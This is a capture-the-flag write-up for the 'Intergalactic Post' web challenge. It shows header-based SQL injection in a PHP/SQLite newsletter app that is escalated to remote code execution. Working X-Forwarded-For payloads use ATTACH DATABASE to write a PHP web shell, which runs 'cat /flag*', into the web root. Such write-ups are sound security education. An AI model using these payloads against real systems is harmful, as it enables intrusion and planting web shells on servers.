# Intergalactic Post - Cyber Apocalypse 2022

### Given Material
We have been provided with the source code of a web application working as a newsletter application. 
### Identifying the flaw
We can submit some dummy requests from the web app form to "subscribe" an email.

```JSON
{"POST":{"scheme":"http","host":"localhost:1337","filename":"/subscribe","remote":{"Address":"127.0.0.1:1337"}}}
```
And POST body:
```
email=my@email.com
```

Upon inspecting the code, the part that handles our request is the following:

```php
<?php
class SubscriberModel extends Model
{

    public function __construct()
    {
        parent::__construct();
    }

    public function getSubscriberIP(){
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        return '';
    }
    
    public function subscribe($email)
    {
        $ip_address = $this->getSubscriberIP();
        return $this->database->subscribeUser($ip_address, $email);
    }
}
```
The given code that handles the database methods is also:

```php
<?php
class Database
{
    private static $database = null;

    public function __construct($file)
    {
        if (!file_exists($file))
        {
            file_put_contents($file, '');
        }
        $this->db = new SQLite3($file);
        $this->migrate();

        self::$database = $this;
    }

    public static function getDatabase(): Database
    {
        return self::$database;
    }

    public function migrate()
    {
        $this->db->query('
            CREATE TABLE IF NOT EXISTS `subscribers` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address VARCHAR(255) NOT NULL,
                email VARCHAR(255) NOT NULL
            );
        ');
    }

    public function subscribeUser($ip_address, $email)
    {
        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
    }
}
```

It seems that the email and ip address parameters are not sanitized properly hence we can inject SQL statements. 

### First (failed) attempt
At first, we tried to inject SQL statements at the email parameter but the following filter gets in the way.
```php
 public function store($router)
    {
        $email = $_POST['email'];

        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            header('Location: /?success=false&msg=Please submit a valild email address!');
            exit;
        }

        $subscriber = new SubscriberModel;
        $subscriber->subscribe($email);

        header('Location: /?success=true&msg=Email subscribed successfully!');
        exit;
    }
```
The FILTER_VALIDATE_EMAIL as a php built-in filter, uses the RFC 5321 standard which allows quoted strings and some special characters that could be useful in our injection. However the following working payloads were beyond the character limit the local-part of an email allows so injecting the email field lead to nowhere.

### Working Injection
The only field remaining to try to inject is the IP field. As we saw earlier in the code, the IP field gets filled with values from the php $_SERVER array. Those fields were not validated afterwards hence we can simpy place an HTTP header in our request that looks like the following and inject any given values in the IP field:

```
X-Forwarded-For: DUMMY_FIELD
```

### SQLite3 Injection + php = RCE
We can now execute SQL statements but we still need to read the flag under the /flag.txt path. The golden statement that worked a stepping stone was the following:

```sql
ATTACH DATABASE file_name AS database_name;
```

The statement associates the database file file_name with the current database connection under the logical database name database_name. If the database file file_name does not exist, the statement creates a new database file. We can attach a database with a dummy name and a php file extension under web root. The following header does exactly that and also creates a table for us to inject php code.

```
X-Forwarded-For: ','a');ATTACH DATABASE '/www/x.php' AS x;CREATE TABLE x.p (d text);
```

Finally another request with the following header writes the payload.
```
X-Forwarded-For: ','a');ATTACH DATABASE '/www/x.php' AS x;INSERT INTO x.p (d) VALUES ("<?php system('cat /flag*')?>");
```

Now we just have to visit /x.php with our browser to trigger our code.
![flagpoc](https://github.com/apostolides/ctf-writeups/blob/master/Cyber-Apocalypse-2022/Intergalactic_Post/flag.png)

Special thanks to [sealmove]([https://www.google.com](https://github.com/sealmove/) for helping with this challenge.
